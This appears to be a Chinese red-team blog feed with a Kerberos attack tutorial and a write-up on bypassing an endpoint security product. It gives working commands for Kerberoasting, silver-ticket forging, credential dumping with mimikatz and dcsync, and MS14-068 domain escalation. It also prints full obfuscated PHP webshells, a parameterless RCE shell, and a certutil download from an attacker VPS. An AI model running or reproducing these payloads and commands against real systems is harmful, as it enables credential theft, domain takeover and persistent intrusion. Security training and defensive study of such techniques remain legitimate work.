<p>在<code>padata</code>中有很重要的一部分叫做<code>AP-REQ</code>，这是<code>TGS-REQ</code>中必须有的数据， <strong>这部分会携带AS-REP里面获取到的TGT票据</strong> ， <strong>KDC检验TGT票据，如果票据正确，返回ST票据</strong> 。</p>
<figure data-type="image" tabindex="36"><img src="https://redteamblog.icu/post-images/assets/image-20220322105755-riaaq7i.png" alt="image.png" loading="lazy"></figure>
<figure data-type="image" tabindex="37"><img src="https://redteamblog.icu/post-images/assets/image-20220322110334-q05kp1a.png" alt="image.png" loading="lazy"></figure>
<p><code>TGS-REQ</code>请求包中的<code>authenticator</code>就是<code>AS-REP</code>响应包返回的<code>Login Session key</code>加密的时间戳</p>
<p>在<code>req-body</code>中</p>
<figure data-type="image" tabindex="38"><img src="https://redteamblog.icu/post-images/assets/image-20220322110512-b4h29zo.png" alt="image.png" loading="lazy"></figure>
<pre><code class="language-html">padding:0
kdc-options:用于与KDC约定一些选项设置
realm:域名
sname:这里是要请求的服务
till:到期时间
    rebeus和kekeo都是20370913024805Z，可用于作为特征值检验用
nonce:随机生成数 
    kekeo/mimikatz的nonce为12381973，rubeus的nonce为1818848256,可用于作为特征值检验    用
etype:加密类型
</code></pre>
<h4 id="tgs-rep数据包分析"><strong>TGS-REP数据包</strong>分析</h4>
<p><code>TGS-REP</code>：当TGS收到请求后，将会检查自身是否存在客户端所请求的服务，如果服务存在， <strong>通过krbtgt用户的NTML hash解密TGT并且得到Login Session Key</strong> ，通过 <strong>Login Session Key解密Authenticator</strong> 。</p>
<figure data-type="image" tabindex="39"><img src="https://redteamblog.icu/post-images/assets/image-20220322110904-lbezjaa.png" alt="image.png" loading="lazy"></figure>
<p>这一系列解密成功的话，<strong>将会验证对方的身份，验证时间戳是否在范围内，并且检查TG中的时间戳是否过期，且原始地址是否和TGT中保存的地址相同</strong></p>
<p>完成认证后，TGS生成<strong>ST票据（包括客户端信息和原始Server Session key，整个ST服务票据使用该服务的NTML hash加密</strong>以及一个 <strong>AS-REP返回的Login-Session-Key加密的Server Session Key</strong> （也就是最外层enc-part部分)。并且会为该客户端生成ST服务票据。这两个将在响应包中发送给Client。</p>
<figure data-type="image" tabindex="40"><img src="https://redteamblog.icu/post-images/assets/image-20220322111343-kk058u8.png" alt="image.png" loading="lazy"></figure>
<p>ST服务票据主要包含两方面的内容：客户端用户信息 和 原始Service Session Key，整个ST服务票据用该服务的NTLM Hash进行加密。最终Service Session Key 和 ST服务票据 发送给客户端。</p>
<p>PS:在这一步中，不论用户是否有权限访问服务，只要TGT解密无误，都将返回ST服务票据。<strong>任何一个用户，只要hash正确，就可以请求域内任何一个服务的票据</strong>，这也是kerberoasting能利用的原因。</p>
<p>enc-part：这部分是用请求服务的密码Hash加密的。因此如果我们拥有服务的密码Hash，那么我们就可以自己制作一个ST服务票据，这就造成了白银票据攻击。也正因为该票据是用请求服务的密码Hash加密的，所以当我们得到了ST服务票据，可以尝试爆破enc_part，来得到服务的密码Hash。这也就造成了kerberoast攻击。</p>
<h5 id="tgs-rep的攻击面">TGS-REP的攻击面</h5>
<h6 id="1kerberoast攻击">1.Kerberoast攻击</h6>
<p>概念：<strong>就是攻击者为了获取目标服务的访问权限，而设法破解Kerberos服务票据并重写它们的过程。这是红队当中非常常见的一种攻击手法，因为它不需要与服务目标服务进行任何交互，并且可以使用合法的活动目录访问来请求和导出可以离线破解的服务票据，以获取到最终的明文密码。之所以出现这种情况，是因为服务票据使用服务帐户的散列（NTLM）进行加密，所以任何域用户都可以从服务转储散列，而无需将shell引入运行该服务的系统中。</strong></p>
<p>攻击者通常会选择那些可能设置了弱密，码破解成功率较高的票据来尝试破解。一旦攻击者成功破解出了票据，他们有时不仅仅获取的只是服务访问权限，如果服务被配置为在高权限下运行，那么整个域都将可能被攻击者拿下。这些票据可以通过考虑多种因素来识别，例如：</p>
<blockquote>
<p>SPNs绑定到域用户账户</p>
<p>最后一次密码设置（Password last set）</p>
<p>密码过期时间</p>
<p>最后一次登录（Last logon）</p>
</blockquote>
<p>具体来说，Kerberoast攻击涉及以下五个步骤：</p>
<blockquote>
<p><a href="http://www.freebuf.com/system/174229.html?preview=true">服务主体名称（SPN）发现</a></p>
<p>请求服务票据</p>
<p>导出服务票据</p>
<p>破解服务票据</p>
<p>重写服务票据&amp;RAM注入</p>
</blockquote>
<p>原理：</p>
<ul>
<li>知道相关服务的 SPN 后，可以用 SPN 申请一张 ST 票据。在 kerberos 协议的第 4 步，用户会收到由 server 实例的 NTLM hash 加密生成的 ST 票据，加密算法为 RC4-HMAC-MD5，尝试穷举 hash，模拟加密过程，进行破解（注意和银票的区别）。</li>
<li>任何域用户都可以合法的从 AD 中提取服务账号凭据，不需要与服务目标服务进行任何交互，大多数操作都是离线完成，不会触发告警。</li>
<li>服务账号密码未设置过期时间，或者与域普通用户密码相同以及账号权限过高等都是问题。</li>
<li>域内具有 Read servicePrincipalName 和 Write serverPrincipalName 的域用户具有注册 SPN 的权利。</li>
</ul>
<p>流程：</p>
<ol>
<li>找到有价值的 SPN（需要满足的条件：该 SPN 注册在域用户帐户下并且域用户账户的权限较高）</li>
<li>请求 TGS</li>
<li>导出 ST</li>
<li>暴力破解</li>
<li>服务票据重写</li>
<li>权限维持</li>
</ol>
<p>前面没有了解到SPN，所以先了解一下SPN之后再回头来做实践。</p>
<h4 id="spn">SPN</h4>
<p>概念：</p>
<p>SPN，全名为：Service Principal Names，即“服务主体名称”。它是域中服务的唯一标识，每个Kerberos服务都必须要有一个SPN，服务在加入域时，会自动注册一个SPN。 如果未进行 SPN 注册或注册失败（名称不唯一），则 Windows 安全层无法确定与 SPN 关联的帐户，因而无法使用 Kerberos 身份验证。</p>
<p>格式：</p>
<p>SPN的格式为：<code>&lt;service class&gt;/&lt;host&gt;:&lt;port&gt;/&lt;service name&gt;</code>，其中service class和host为必需参数。</p>
<ul>
<li>service class为服务类型名称，你可以使用除“/”之外的任何名称（因为SPN使用它作为分隔符），只需要保证它是唯一的名称，但是一般建议使用通用名称，如“www”，“ldap”等</li>
<li>host为运行服务的主机名，可以使用DNS名（如：os.hacker.com）或NetBIOS名（如：os），但要注意的是因为NetBIOS名可能会在林中不唯一，会导致SPN注册失败。</li>
<li>host为可选参数，同一服务在同一host上运行时，使用此来加以区别。服务仅使用默认端口时（如80），可以省略。</li>
<li>service name为服务实例名称，不太重要，微软有个这样的例子:MyDBService/host1/CN=hrdb,OU=mktg,DC=example,DC=com</li>
</ul>
<p>一个SPN命名实例：<code>MySQLSvc/os.hacker.com:3306</code> 或 <code>MySQLSvc/hacker</code>等。</p>
<p>分类：</p>
<ul>
<li>当一个服务的权限为 Local System 或 Network Service，则 SPN 会自动注册在机器帐户下。</li>
<li>当一个服务的权限为一个域用户，则 SPN 需要手动注册在域用户帐户下。</li>
</ul>
<p>验证：</p>
<p>在 Kerberos 验证第 3 步中，client 向 TGS 发送 TGT 的同时，发送需要访问服务的 SPN；在第 4 步，TGS 会查询对应 SPN 的服务记录，找到服务后开始验证 TGT，最后 TGS 生成对应 SPN 服务的 ST 票据。</p>
<h5 id="查询spn">查询SPN</h5>
<p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测。</p>
<h5 id="使用setspn">使用SetSPN</h5>
<p>Win7和Windows Server2008自带的工具</p>
<p>查看当前域内的所有SPN：</p>
<pre><code class="language-html">setspn.exe -q */*
</code></pre>
<figure data-type="image" tabindex="41"><img src="https://redteamblog.icu/post-images/assets/image-20220322172723-gm88pui.png" alt="image.png" loading="lazy"></figure>
<p>查看redteam.com域内的所有SPN：</p>
<pre><code class="language-html">setspn.exe -T redteam.com -q */*
</code></pre>
<figure data-type="image" tabindex="42"><img src="https://redteamblog.icu/post-images/assets/image-20220322172643-i6cxyr2.png" alt="image.png" loading="lazy"></figure>
<h4 id="实现kerberoasting攻击的前提">实现Kerberoasting攻击的前提</h4>
<ul>
<li>对于kerberos协议认证过程中返回的tgs_reply，在已知加密算法的前提下，我们可以尝试穷举口令。( <strong>服务密码一般默认为弱密码</strong> )</li>
<li>Windows系统通过SPN查询获得服务和服务实例帐户的对应关系</li>
<li>域内的主机都能查询SPN。</li>
<li>域内的任何用户都可以向域内的任何服务请求TGS。</li>
</ul>
<h5 id="申请st票据">申请ST票据</h5>
<p>前面提到过寻找有价值的SPN服务，那么什么是有价值的呢</p>
<p><strong>可以远程连接，高权限</strong> ，因为计算机域帐户不可以远程连接，所以我们目标一般都是域用户。</p>
<p>使用Rubeus工具</p>
<p><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
<p>这是一个专门针对Kerberos的工具包。</p>
<pre><code class="language-html">#依赖.net环境
Rubeus.exe kerberoast
</code></pre>
<figure data-type="image" tabindex="43"><img src="https://redteamblog.icu/post-images/assets/image-20220323095223-w9wmxlv.png" alt="image.png" loading="lazy"></figure>
<p>将哈希保存为hash.txt文件，放到hashcat的目录下。使用命令</p>
<pre><code class="language-html">hashcat64.exe -m 13100 hash.txt pass.txt
</code></pre>
<h6 id="使用powershell命令请求">使用Powershell命令请求</h6>
<p>使用微软提供的类KerberosRequestorSecurityToken发起Kerberos请求，申请指定SPN的ST票据。Kerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据</p>
<pre><code>#请求服务票据
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;SPN名&quot;
#New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/WIN-7.bean.testlab:1433&quot;

#列出服务票据
klist
</code></pre>
<h6 id="使用mimikatz请求">使用mimikatz请求</h6>
<p>申请指定SPN的ST票据</p>
<pre><code>#请求服务票据
kerberos::ask /target:MSSQLSvc/WIN-7.bean.testlab:1433

#列出服务票据
kerberos::list

#清除所有票据
kerberos::purge
</code></pre>
<h6 id="使用impacket中的getuserspns请求">使用Impacket中的GetUserSPNs请求</h6>
<p>需要提供域账户密码才能使用，该脚本会直接输出hashcat格式的服务票据，可以直接使用hashcat进行爆破</p>
<pre><code>#GetUserSPNs.exe -request -dc-ip x.x.x.x 域名称/域用户:密碼
GetUserSPNs.exe -request -dc-ip 172.16.1.1 bean.testlab/test:test123456 &gt; r.txt
</code></pre>
<h5 id="导出服务票据">导出服务票据</h5>
<p>查看票据列表可用一些命令：</p>
<pre><code>#cmd
klist

#mimikatz
mimikatz.exe &quot;kerberos::list&quot;

#MSF
load kiwi
kerberos_ticket_list
或
load kiwi
kiwi_cmd kerberos::lists
</code></pre>
<p>导出：</p>
<pre><code>#mimikatz 导出后缀为.kirbi
mimikatz.exe &quot;kerberos::list /export&quot; &quot;exit&quot;

#Empire下的Invoke-Kerberos.ps1
powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat}&quot;
</code></pre>
<h5 id="暴力破解">暴力破解</h5>
<p>tgsrepcrack.py</p>
<p>kerberoast工具包中的tgsrepcrack.py，<strong>可直接对mimikatz导出.kirbi文件进行破解</strong></p>
<pre><code>python tgsrepcrack.py pass.txt xx.kirbi
</code></pre>
<figure data-type="image" tabindex="44"><img src="https://redteamblog.icu/post-images/assets/image-20220323103324-l2zl16m.png" alt="image.png" loading="lazy"></figure>
<p>tgscrack</p>
<p>下载地址：<a href="https://github.com/leechristensen/tgscrack">tgscrack</a></p>
<pre><code class="language-html">python2 extractServiceTicketParts.py xxx.kirbi &gt; hash.txt
go run tgscrack.go -hashfile hash.txt -wordlist pass.txt
</code></pre>
<figure data-type="image" tabindex="45"><img src="https://redteamblog.icu/post-images/assets/image-20220323103357-sa8aijd.png" alt="image.png" loading="lazy"></figure>
<p>hashcat</p>
<p>前面好几种导出hash的方式，都可以使用hashcat来爆破</p>
<pre><code>hashcat.exe -m 13100 hash.txt pass.txt
</code></pre>
<figure data-type="image" tabindex="46"><img src="https://redteamblog.icu/post-images/assets/clip-20220323092140-pgyx400.png" alt="Image" title="Image" loading="lazy"></figure>
<h6 id="服务票据重写ram注入">服务票据重写&amp;RAM注入</h6>
<p>ST票据使用服务密码的NTLM哈希签名。如果票据散列已被破解，那么可以使用Kerberoast python脚本重写票据。这将允许在服务被访问时模拟任何域用户或伪造账户。此外，提权也是可能的，因为用户可以被添加到诸如域管理员的高权限组中。</p>
<pre><code>python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500
python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512
</code></pre>
<p>使用以下Mimikatz命令将新票据重新注入内存，以便通过Kerberos协议对目标服务执行身份验证。</p>
<pre><code>kerberos::ptt PENTESTLAB.kirbi
</code></pre>
<h6 id="参考">参考</h6>
<p><a href="https://www.cnblogs.com/backlion/p/15652052.html">域渗透-SPN</a></p>
<h4 id="白银票据">白银票据</h4>
<p>在TGS-REP阶段，TGS_REP里面的ticket的enc-part是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是TGS票据，不需要跟域控打交道，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由KDC颁发TGT，并且在生成伪造的TGT得20分钟内，TGS不会对该TGT的真伪进行效验。如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST，所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用。</p>
<h5 id="白银票据的特点">白银票据的特点</h5>
<p>1.白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。</p>
<p>2.黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务。</p>
<p>3.大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</p>
<p>4.攻击者需要服务帐户密码哈希值</p>
<p>5.TGS是伪造的，所以没有和TGT通信，意味着DC从验证过。</p>
<p>6.任何事件日志都在目标服务器上。</p>
<h6 id="白银票据和黄金票据区别">白银票据和黄金票据区别</h6>
<ul>
<li>获取的权限不同<br>
金票：伪造的TGT，可以获取任意Kerberos的访问权限<br>
银票：伪造的ST，只能访问指定的服务，如CIFS</li>
<li>认证流程不同<br>
金票：同KDC交互，但不同AS交互<br>
银票：不同KDC交互，直接访问Server</li>
<li>加密方式不同<br>
金票：由krbtgt NTLM Hash 加密<br>
银票：由服务账号 NTLM Hash 加密</li>
</ul>
<h6 id="白银票据实践">白银票据实践</h6>
<p>我们伪造凭证，需要以下信息</p>
<ul>
<li>要伪造的域用户(任意用户或者不存在的用户，这里我们一般填写域管理员账户)</li>
<li>域名</li>
<li>域的SID值(就是域成员SID值去掉最后的一节)</li>
<li>目标服务的FQDN（FQDN：全限定域名，同时带有主机名和域名的名称。如：dc.bean.testlab）</li>
<li>可利用的服务</li>
<li>域服务账户NTLM哈希</li>
<li>只有KDC能制作和查看PAC。</li>
</ul>
<h5 id="白银票据的服务列表"><strong>白银票据的服务列表</strong></h5>
<pre><code>服务名称                    同时需要的服务
WMI                        HOST、RPCSS
PowerShell Remoting        HOST、HTTP
WinRM                    HOST、HTTP
Scheduled Tasks            HOST
Windows File Share        CIFS
LDAP                    LDAP
Windows Remote Server    RPCSS、LDAP、CIFS
</code></pre>
<p>除上述外目标机器不能开启PAC（特权属性证书）验证，PAC用于客户端和服务端交互阶段用于鉴权，带有签名，如果没有krbtgt的hash以及服务的hash就没办法伪造有效的签名。（MS14-068可绕过）</p>
<pre><code class="language-html">#域控下执行
mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.txt

#也可使用dcsync在其他机器的域管账户下执行，用户填域控的机器名
mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:bean.testlab /user:dc$&quot; &quot;exit&quot; &gt; 1.txt
</code></pre>
<figure data-type="image" tabindex="47"><img src="https://redteamblog.icu/post-images/assets/image-20220323115150-gldyx07.png" alt="image.png" loading="lazy"></figure>
<p>e49051446e697bb3f91bac430da93c3e</p>
<p>S-1-5-21-767623950-3225260823-3670188588</p>
<h4 id="伪造cifs">伪造CIFS</h4>
<p>伪造CIFS权限，CIFS常用于主机之间的文件共享</p>
<pre><code class="language-html">#mimikatz.exe &quot;kerberos::golden /domain:域名 /sid:域SID /target:目标的FQDN /service:服务类型 /rc4:NTLMHash /user:伪造的用户名 /ptt&quot;

mimikatz.exe ”kerberos::golden /domain:redteam.com /sid:S-1-5-21-767623950-3225260823-3670188588 /target:dc.redteam.com /service:cifs /rc4:e49051446e697bb3f91bac430da93c3e /user:administrator /ptt“

* /domain：域名
* /sid ；sid值
* /target：域控制器全称
* /service：需要指定相关的服务名，此处为cifs
* /rc4:域控的计算机账户ntlm hash
*  /user：要伪造的用户名，任意写

dir \\dc\c$
</code></pre>
<figure data-type="image" tabindex="48"><img src="https://redteamblog.icu/post-images/assets/0d3ce145bfd91b6d12a74820d58a58e-20220323123354-qxvt9dg.png" alt="0d3ce145bfd91b6d12a74820d58a58e.png" loading="lazy"></figure>
<p>访问DC成功。</p>
<h2 id="kerberos协议的各阶段攻击手法">Kerberos协议的各阶段攻击手法</h2>
<figure data-type="image" tabindex="49"><img src="https://redteamblog.icu/post-images/assets/clip_13-20220311155316-n4g07of.png" alt="Image" title="Image" loading="lazy"></figure>
<h2 id="ms14-068域提权">MS14-068域提权</h2>
<p><strong>一、漏洞说明</strong></p>
<pre><code>  改漏洞可能允许攻击者将未经授权的域用户账户的权限,提权到域管理员的权限。

  微软官方解释: https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-068
</code></pre>
<p><strong>二、漏洞原理</strong></p>
<pre><code>  Kerberos认证原理:https://www.cnblogs.com/huamingao/p/7267423.html

  服务票据是客户端直接发送给服务器,并请求服务资源的。如果服务器没有向域控dc验证pac的话,那么客户端可以伪造域管的权限来访问服务器。
</code></pre>
<p><strong>三、漏洞利用前提</strong></p>
<p>1.域控没有打MS14-068的补丁</p>
<p>2.攻击者拿下了一台域内的普通计算机,并获得普通域用户以及密码/hash值，以及用户的suid</p>
<p><strong>四、工具下载</strong></p>
<p>Ms14-068.exe 下载地址:https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</p>
<p>PSexec 下载地址:https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe</p>
<p>mimikatz 下载地址:https://github.com/gentilkiwi/mimikatz/releases</p>
<p><strong>五、漏洞利用</strong></p>
<p>如果当前用户为域用户</p>
<p>可以直接用 whoami /user 获取sid</p>
<figure data-type="image" tabindex="50"><img src="https://redteamblog.icu/post-images/assets/image-20220328103552-5ugwlvm.png" alt="image.png" loading="lazy"></figure>
<p>如果不是只是本地用户可以用mimikatz 抓取本地的域用户密码</p>
<p>记住mimikatz要有管理员权限不然无法抓取内存密码，可以以管理员权限运行。</p>
<figure data-type="image" tabindex="51"><img src="https://redteamblog.icu/post-images/assets/image-20220328103647-87lrxis.png" alt="image.png" loading="lazy"></figure>
<h3 id="利用ms14-068exe-工具生成伪造的kerberos协议认证证书">利用ms14-068.exe 工具生成伪造的kerberos协议认证证书</h3>
<p>MS14-068.exe -u <userName>@<domainName> -p <clearPassword> -s <userSid> -d <domainControlerAddr></p>
<p>ms-14-068.exe -u   域用户@域控名  -p 域用户密码 -s 域用户sid -d 域ip</p>
<figure data-type="image" tabindex="52"><img src="https://redteamblog.icu/post-images/assets/image-20220328103753-47ho0q0.png" alt="image.png" loading="lazy"></figure>
<p>利用mimikatz.exe将证书写入，从而提升为域管理员</p>
<p>kerberos::ptc 你的证书名字</p>
<p>kerberos::ptc TGT_zhangsan@ggyao.com.ccache</p>
<p>写入成功后，成功dir域控C盘</p>
<figure data-type="image" tabindex="53"><img src="https://redteamblog.icu/post-images/assets/image-20220328103916-44w88zo.png" alt="image.png" loading="lazy"></figure>
<h3 id="使用psexecexe获取一个交互式shell">使用psexec.exe获取一个交互式shell</h3>
<p>psexec.exe \WIN-2008-DC.ggyao.com cmd</p>
<figure data-type="image" tabindex="54"><img src="https://redteamblog.icu/post-images/assets/image-20220328104019-8sunvsb.png" alt="image.png" loading="lazy"></figure>
<p>psexec执行单条命令：<br>
psexec.exe \WIN-2008-DC.ggyao.com cmd /c “ipconfig”</p>
<figure data-type="image" tabindex="55"><img src="https://redteamblog.icu/post-images/assets/image-20220328104029-2f7onso.png" alt="image.png" loading="lazy"></figure>
<h3 id="方法2goldenpacexe推荐使用">方法2：goldenPac.exe（推荐使用）</h3>
<p>（https://github.com/maaaaz/impacket-examples-windows）<br>
此工具是impacket工具包里的，它是MS14-068+psexec的组合，因此使用起来非常放方便快捷。<br>
goldenPac.exe ggyao.com/zhangsan:Aatesttest@WIN-2008-DC.ggyao.com</p>
<figure data-type="image" tabindex="56"><img src="https://redteamblog.icu/post-images/assets/image-20220328104102-ton5t02.png" alt="image.png" loading="lazy"></figure>
<h3 id="方法3kekeoexe">方法3：kekeo.exe</h3>
<p>（https://github.com/gentilkiwi/kekeo/releases）<br>
通过kekeo.exe获取域控权限，此工具并非每次都能成功利用。<br>
kekeo.exe “exploit::ms14068 /domain:ggyao.com /user:zhangsan /password:Aatesttest /ptt” “exit”</p>
<figure data-type="image" tabindex="57"><img src="https://redteamblog.icu/post-images/assets/image-20220328104140-frff7op.png" alt="image.png" loading="lazy"></figure>
<h3 id="注意事项">注意事项</h3>
<p>1.票据伪造的机器不一定需要在域里，将DNS指向域控，能解析就行。</p>
<p>2.IPC$访问域控的时候需要使用主机名，不能使用IP。</p>
<h3 id="漏洞原理">漏洞原理：</h3>
<p>其实出现这个问题的关键点在于PAC(特权属性证书:验证用户所拥有的权限)</p>
<p>先大致回顾一下Kerberos的认证流程</p>
<ul>
<li>域用户登录，向KDC的AS服务发送自身密码加密的时间戳进行预认证；</li>
<li>DC的AS服务验证用户密码是否正确。若正确，返回一张TGT票据，该票据为krbtgt密码加密而成；</li>
<li>域用户凭借TGT票据向KDC的TGS服务申请访问某Server服务的票据；</li>
<li>域控的TGS服务验证TGT后，返回给域用户能够访问该Server服务的票据(ST, TGS Ticket)；</li>
<li>域用户拿着ST访问对应的Server服务；</li>
<li>该Server服务验证ST，决定是否允许让域用户访问。</li>
</ul>
<p>其中，PAC是默认包含在TGT中的；</p>
<p>通常情况下，AS_REQ 请求中如果include-pac被置为 true，只要 AS 服务通过了域用户的认证，则会在返回的 AS_REP 数据包中的 TGT 中加入 PAC 信息；</p>
<p>而如果在 AS_REQ 请求时，include-pac被置为 false，则 AS_REP 返回的 TGT 中就不会包含 PAC 信息。</p>
<p>于是在AS_REP返回的TGT中没有PAC信息后，域用户则可以伪造&quot;恶意&quot;的PAC放入TGS_REQ中，KDC解密PAC后会再次加密到一个新的TGT中并返回给域用户，此时的TGT中已经携带了“恶意”PAC，也就达到漏洞利用的目的。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[浅谈bypass金山终端安全系统的心路历程]]></title>
        <id>https://redteamblog.icu/post/qian-tan-bypass-jin-shan-zhong-duan-an-quan-xi-tong-de-xin-lu-li-cheng/</id>
        <link href="https://redteamblog.icu/post/qian-tan-bypass-jin-shan-zhong-duan-an-quan-xi-tong-de-xin-lu-li-cheng/">
        </link>
        <updated>2022-04-23T06:35:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="关于金山终端的bypass心路历程">关于金山终端的bypass心路历程</h1>
<h3 id="浅谈bypass金山终端安全系统的心路历程"><strong>浅谈bypass金山终端安全系统的心路历程</strong></h3>
<h3 id="1漏洞详情"><strong>1.漏洞详情</strong></h3>
<p>任意文件下载</p>
<figure data-type="image" tabindex="1"><img src="https://redteamblog.icu/post-images/1650697624370.png" alt="" loading="lazy"></figure>
<pre><code>/htmltopdf/downfile.php?filename=xxx

/conf
/.ssh
.....
</code></pre>
<p>任意文件上传</p>
<figure data-type="image" tabindex="2"><img src="https://redteamblog.icu/post-images/1650697685858.png" alt="" loading="lazy"></figure>
<h3 id="2getshell"><strong>2.getshell</strong></h3>
<p>遇到几个问题</p>
<p>1.上传任意文件被秒删，只能存活一秒。</p>
<p>2.php的 <code>eval、create_function、base64_decode</code> 等敏感函数被杀，以及函数不能传递任何参数，但system等命令执行函数能执行。</p>
<p>3.无法执行敏感命令操作，比如 <code>net user /add</code> ，ps反弹cs等。</p>
<p>对于第一个问题，虽然只能存活一秒，但是能执行成功，我们可以往其他目录写shell。比如</p>
<pre><code class="language-php">&lt;?php file_put_contents(&quot;../../xx.php&quot;,'xxxx');
</code></pre>
<p>这样可以解决第一个问题，我们可以写shell到其他目录来bypass。</p>
<p>第二个问题，<code>eval</code> 函数被禁用，不能传递参数，需要传递参数的shell均无法执行。比如冰蝎</p>
<pre><code class="language-php">&lt;?php
@error_reporting(0);
session_start();
    $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
    $_SESSION['k']=$key;
    session_write_close();
    $post=file_get_contents(&quot;php://input&quot;);
    if(!extension_loaded('openssl'))
    {
        $t=&quot;base64_&quot;.&quot;decode&quot;;
        $post=$t($post.&quot;&quot;);

        for($i=0;$i&lt;strlen($post);$i++) {
                 $post[$i] = $post[$i]^$key[$i+1&amp;15];
                }
    }
    else
    {
        $post=openssl_decrypt($post, &quot;AES128&quot;, $key);
    }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
    class C{public function __invoke($p) {eval($p.&quot;&quot;);}}
    @call_user_func(new C(),$params);
?&gt;
</code></pre>
<p>简单观察一下冰蝎的马，首先是有post传参，然后是 <code>eval</code> 函数，所以pass了。然后我们先观察蚁剑的插件生成的免杀马</p>
<pre><code class="language-php">&lt;?php
class JADE {
    function aoMy() {
        $mmaQ = &quot;\x29&quot; ^ &quot;\x48&quot;;
        $kndi = &quot;\xda&quot; ^ &quot;\xa9&quot;;
        $yRpX = &quot;\xb7&quot; ^ &quot;\xc4&quot;;
        $tHGH = &quot;\x1f&quot; ^ &quot;\x7a&quot;;
        $EBzf = &quot;\x35&quot; ^ &quot;\x47&quot;;
        $WFrO = &quot;\x4b&quot; ^ &quot;\x3f&quot;;
        $iGgJ =$mmaQ.$kndi.$yRpX.$tHGH.$EBzf.$WFrO;
        return $iGgJ;
    }
    function __destruct(){
        $KUht=$this-&gt;aoMy();
        @$KUht($this-&gt;rx);
    }
}
$jade = new JADE();
@$jade-&gt;rx = isset($_GET['id'])?base64_decode($_POST['qwq']):$_POST['qwq'];
?&gt;
</code></pre>
<p>特征很明显。再来看看蚁剑自带的。</p>
<pre><code class="language-php">&lt;?php
    $YCgX=create_function(chr(7560/210).chr(645-530).chr(01674-01515).base64_decode('bQ==').str_rot13('r'),chr(0265370/01630).chr(0324020/01630).str_rot13('n').str_rot13('y').str_rot13('(').str_rot13('$').chr(0252733/01371).chr(01275-01116).str_rot13('z').chr(204-103).base64_decode('KQ==').chr(21948/372));
$YCgX(base64_decode('OTE3M'.'DMwO0'.'BldkF'.'sKCRf'.''.str_rot13('H').base64_decode('RQ==').chr(225-168).chr(01154-01030).chr(0160150/01234).''.''.chr(25410/363).chr(384-268).str_rot13('0').base64_decode('Wg==').base64_decode('WA==').''.'N0XSk'.'7Mjc1'.'MTA5M'.'Ds='.''));?&gt;
</code></pre>
<p>通过<code>str_rot13</code>和<code>base64</code>相关的字符串处理函数来进行bypass，但是明显有create_function函数在，也被过滤了，后面猜想企业终端云防护应该收录了这种公开的shell，常规bypass应该绕不过。</p>
<p>经过n多种尝试，发现并不能达成直接连上冰蝎或者蚁剑的要求，转换思路尝试写个没有参数传递的能执行命令的伪shell</p>
<p><strong>php无参数rce</strong>，ctf多年前的考点，比如。</p>
<pre><code class="language-php">&lt;?=system(end(getallheaders()));
</code></pre>
<p>当时时间紧迫，只是临时构造了个demo，关于无参数rce还有很多形式的方法。</p>
<h3 id="3获取权限"><strong>3.获取权限</strong></h3>
<p>第二个问题解决了。来到了第三个问题，如何进一步获取主机权限？首先尝试了各种方法。比如</p>
<p>1.远程ps上线（毫无意外的被拦截，应该是云防护拦截的</p>
<p>2.通过<code>net user /add</code>操作添加用户然后3389连，当然这儿已经在内网了，所以可以直接连接。(被拦)</p>
<p>也尝试利用<code>C:\Windows\System32\net1.exe</code>来进行添加，或者通过<code>COPY</code>命令复制<code>net1.exe</code>来绕过防护，比如</p>
<pre><code class="language-powershell">COPY C:\Windows\System32\net1.exe C:\Users\Public\test
start test user xxx /add
</code></pre>
<p>很遗憾被拦截了。</p>
<p>最后经过ping探测，发现出网，决定利用<code>certutil</code>来实现远程下载。比如</p>
<pre><code class="language-bash">certutil -urlcache -split -f http://vps/xxx xxx
</code></pre>
<p>简单服务器起个<code>http</code>服务之后发现可以下载。不过当下载<code>exe</code>的时候发现被拦截了。直接改成其他后缀绕过。</p>
<p>后面思路就很明显了，远程下载exe然后直接上线。然后又被拦截了，想着难道还要我做免杀？</p>
<p>当时已经深夜了，做免杀未免太耗时间，想着添加个管理员用户直接3389连。但是前面的net命令又被禁用了。又来到了熟悉的bypass环节。</p>
<p><strong>使用windows api添加用户</strong></p>
<p>这个方法在去年hw被大家广泛使用。贴个github项目</p>
<pre><code class="language-powershell">https://github.com/lengjibo/NetUser
</code></pre>
